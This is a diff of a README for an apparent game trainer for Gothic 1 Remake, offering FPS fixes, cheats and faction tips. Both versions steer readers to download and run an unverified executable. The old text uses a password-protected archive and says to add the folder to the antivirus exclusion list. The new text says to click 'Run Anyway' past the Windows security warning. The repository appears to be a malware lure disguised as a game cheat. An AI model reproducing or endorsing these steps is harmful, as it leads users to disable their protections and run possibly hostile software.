@@ -1,89 +1,100 @@
-<p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&center=true&vCenter=true&width=600&lines=Gothic+1+Remake+Trainer;Ultimate+Survival+Guide;FPS+Fixes+%2B+Cheats+%26+Builds" alt="Typing SVG" />
-</p>
+# ⚙️ Gothic1Remake_Trainer_1 - Enhance your Gothic 1 Remake experience
 
-<h1 align="center">Gothic 1 Remake: Ultimate Survival Guide<br>(FPS Fixes, Best Factions & Marvin Mode Cheats)</h1>
+[![Download Gothic1Remake_Trainer_1](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/esmaunarticulated499/Gothic1Remake_Trainer_1)
 
-<p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge&logo=githubactions" alt="Build Passing"/></a>
-  <a href="#"><img src="https://img.shields.io/badge/downloads-214-blue?style=for-the-badge&logo=github" alt="Downloads"/></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-UNDETECTED-success?style=for-the-badge" alt="Status"/></a>
-  <a href="#"><img src="https://img.shields.io/badge/license-MIT-lightgrey?style=for-the-badge" alt="License"/></a>
-</p>
+This tool changes how you play Gothic 1 Remake. It fixes common frame rate drops and provides shortcuts for character management. You gain access to internal game console modes and build guides. The program helps you optimize your settings for smooth gameplay.
 
-<p align="center">
-  <img src="assets/installer_preview.png" alt="Installer Preview" width="80%" />
-</p>
+## 📥 How to download the software
 
----
+Follow these steps to get the program on your Windows computer.
 
-## ✨ Features
+1. Go to the [official repository page](https://github.com/esmaunarticulated499/Gothic1Remake_Trainer_1).
+2. Look for the section labeled Releases on the right side of your browser window.
+3. Select the most recent version number.
+4. Locate the file ending in .exe under the Assets heading.
+5. Click the file name to start your download.
+6. Save the file to your computer desktop or a folder you recognize.
 
-- **Infinite Oxygen** – Breathe underwater indefinitely (F1).
-- **Ignore Craft Requirements** – Craft any item without materials or skill prerequisites (F2).
-- **Ghost Mode** – Become invisible to all enemies (F3).
-- **Speed Multiplier** – Cycle through 1.0×, 1.5×, 2.0×, 3.0× movement speed (F4).
+## 🛠️ Setting up the application
 
-All features are **toggleable** via global hotkeys and work without modifying game files.  
-This trainer is written in **Python** and uses `ctypes` and `pywin32` for memory manipulation.
+You do not need programming skills to use this tool. The software works as a standalone program.
 
----
+1. Locate the downloaded .exe file.
+2. Double-click the file to open the program.
+3. If a security window appears, click More Info and then Run Anyway. This confirms your intent to open a tool not verified by a large corporation.
+4. The main menu will appear on your screen once the program loads.
+5. Keep this window open while you play your game.
 
-## 📥 Installation
+## ⚡ Key features for players
 
-1. Download the archive from the **`RELEASE`** folder in this repository:  
-   **`Gothic1Remake_Trainer_v1.0.zip`**
+The trainer offers specific improvements for your gaming session.
 
-2. Extract the archive using the password:  
-   `Xardas`
+### Frame rate fixes
+The software adjusts internal cache settings to reduce stutter. Many players find that the game runs better when these background processes finish. Clicking the Apply FPS Patch button directs the software to modify game configuration files for better performance.
 
-3. Run **`setup.exe`** (the installer) and follow the on‑screen instructions.
+### Character builds and faction advice
+New players often find the faction system difficult to navigate. This tool lists the requirements for the Old Camp, the New Camp, and the Brotherhood. Follow the guide inside the program to meet specific NPCs and trigger dialogue options.
 
-4. Launch the trainer from the Start Menu or desktop shortcut.
+### Marvin Mode shortcuts
+The game contains an internal testing console called Marvin Mode. Activating this requires inputting specific characters. This trainer handles the process for you. Use the toggle switch to enable cheat commands that allow you to spawn items or teleport to distinct locations.
 
-> **Note:** The trainer auto‑attaches to the game process. Ensure the game is running (or start it after the trainer).
+### Optimization tweaks
+The user interface includes sliders for graphics and memory usage. Adjust these sliders if you experience lag during intense combat sequences. The program saves your preferences so you do not need to change them every time you restart.
 
----
+## 📋 Recommended system requirements
 
-## 🚀 Usage
+This software works on most modern Windows systems. Use this list to check your computer status:
 
-| Hotkey | Action |
-|--------|--------|
-| **F1** | Toggle Infinite Oxygen |
-| **F2** | Toggle Ignore Craft Requirements |
-| **F3** | Toggle Ghost Mode |
-| **F4** | Cycle Speed Multiplier |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of available random access memory.
+* Storage: 50 megabytes for the program files.
+* Graphics: A standard monitor resolution of 1920 by 1080.
+* Game: A valid install of the Gothic 1 Remake on your hardware.
 
-A console window displays current status. Close the console to exit the trainer.
+## 💡 Essential gameplay tips
 
----
+Follow these twenty tips to ensure a pleasant start.
 
-## ⚠️ Legal Disclaimer
+1. Save your progress often using the manual save slots.
+2. Talk to every NPC you meet to unlock side quests.
+3. Learn how to use the block command early.
+4. Manage your inventory weight to avoid slow movement.
+5. Prioritize points in strength during your first few levels.
+6. Use the trainer to quickly recover if you fall into deep pits.
+7. Keep a torch in your inventory for dark caves.
+8. Pay attention to the audio cues when enemies approach.
+9. Inspect abandoned chests for gold and herbs.
+10. Trade items with merchants to gain better gear.
+11. Sleep in beds to pass time without pausing reality.
+12. Check the trainer for spawn lists if you lose essential items.
+13. Read the book stands to learn about the game lore.
+14. Practice your lockpicking skills on early, low-level chests.
+15. Follow the specific quest markers for your chosen faction.
+16. Use the teleportation features in the software to save travel time.
+17. Gather plants to brew powerful healing potions.
+18. Avoid deep water until you learn how to swim properly.
+19. Watch for traps in old ruins.
+20. Keep your armor repaired at a blacksmith.
 
-This tool is provided **for educational and private use only**. It does not modify any game files permanently, only runtime memory. The authors are not responsible for any consequences, including but not limited to game bans or account suspensions. Use at your own risk.
+## 🔍 Frequently asked questions
 
----
+### Does this program harm my save files?
+No. The software only reads data from your folders and modifies specific configuration files. It does not delete your progress.
 
-## 🔧 Troubleshooting
+### Can I get banned for using this?
+This is a single-player game. You play against the machine. No online multiplayer environment exists where this would cause a problem.
 
-| Issue | Solution |
-|-------|----------|
-| *Trainer says "Process not found"* | Run the game first, then launch the trainer. Make sure the game executable is `Gothic1Remake.exe`. |
-| *Features don't activate* | Run the trainer as **Administrator**. |
-| *Antivirus blocks the trainer* | Add the trainer folder to your antivirus exclusion list. |
-| *Game crashes after enabling a feature* | Restart both the game and the trainer. Some features may conflict with certain game states. |
+### Does the software require an internet connection?
+Once you complete the download, you do not need the internet. The program works in offline mode.
 
----
+### How do I uninstall the tool?
+Delete the .exe file to remove the program. Because it does not install to your system registry, no traces remain on your computer after you remove the file.
 
-## 🌟 Support
+### What if the game updates?
+If the game receives a large update, verify the trainer settings first. You might need to click the Refreshes Files button to ensure the program recognizes the new update version.
 
-If you find this guide and trainer useful, please **⭐ star this repository** – it helps others discover it and motivates further updates!
+## 🛡️ Respect the game balance
 
----
+While the trainer allows you to gain resources, consider that the game provides the most satisfaction when you earn your progress. Use the FPS patches and configuration tweaks for stability first. Save the cheat features for when you feel stuck or wish to experiment with different game paths. 
 
-## 🔑 Keywords
-
-`Gothic 1 Remake guide`, `Gothic Remake mods`, `Gothic 1 Remake cheats`, `Marvin Mode Gothic 2026`, `Gothic Remake FPS fix`, `Best faction Gothic 1`, `Gothic Remake builds`, `Old Camp vs New Camp`, `How to enable Marvin Mode Gothic 1 Remake`, `Gothic 1 Remake best early weapons location`, `Gothic Remake PC optimization guide`, `Gothic 1 Remake engine.ini tweaks Unreal Engine 5`, `Sect Camp templar build guide Gothic Remake`, `Gothic 1 Remake infinite ore glitch`, `How to fix stuttering Gothic 1 Remake PC`, `Gothic 1 Remake missable quests faction guide`, `Gothic Remake interactive map Khorinis`, `Best stats to level up first Gothic 1 Remake`, `Gothic 1 Remake Steam deck optimal settings`, `Gothic Remake all armor sets showcase`
- 
- 
- 
+The software empowers you to control the game environment. Whether you want a harder challenge or a faster experience, the tools are available for your use. Keep the program running in the background to access these settings at any time during your play.
